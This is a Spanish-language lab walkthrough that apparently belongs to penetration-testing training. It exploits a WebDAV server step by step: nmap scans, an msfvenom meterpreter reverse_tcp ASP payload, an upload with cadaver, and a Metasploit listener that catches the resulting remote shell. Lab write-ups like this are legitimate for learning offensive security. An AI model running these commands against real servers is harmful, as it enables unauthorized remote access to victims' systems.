Primero realizamos un escaneo del host basico
nmap 10.2.29.88
![[Pasted image 20240307130932.png]]

Realizamos un escaneo mas preciso sobre el puerto que queremos explotar
nmap -sV -p 80 --script http-enum
![[Pasted image 20240307131243.png]]


Generaramos el  exploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=1234 -f asp > shell.asp![[Pasted image 20240307134246.png]]


Ahora nos conectaremos al servidor utilizando la herramienta cadaver
cadaver http://10.2.29.88/webdav
![[Pasted image 20240307134711.png]]

Una vez dentro cargaremos el archivo
put /root/shell.asp
![[Pasted image 20240307134802.png]]

Ahora si accedemos al navegador a la ruta webdav podremos ver el archivo cargado
![[Pasted image 20240307134914.png]]

Antes de ejecutar el exploit en la maquina victima tendremos que esciuchar desde nuestra maquina atacante, para ello ejecutaremos metasploit y la BBDD de postgresql que sera necesario
service postgresql start && msfconsole
![[Pasted image 20240307135132.png]]

Utilizaremos una carga util que utilizaremos para hacer nuestra maquina host oyente
![[Pasted image 20240307135450.png]]

Configuraremos el exploit para que utilice nuestra IP y el puerto que hemos configurado en el payload que hemos cargado en la maquina y como veremos en la siguiente captura, una vez ejecutado estaremos escuchando desde nuestro host, ahora solo faltara ejecutar el paylaod en la maquina victima
![[Pasted image 20240307135653.png]]

Como podemos ver en esta imagen una vez ejecutado el payload en la maquina victima obtenemos acceso en nuestro host.
![[Pasted image 20240307142800.png]]



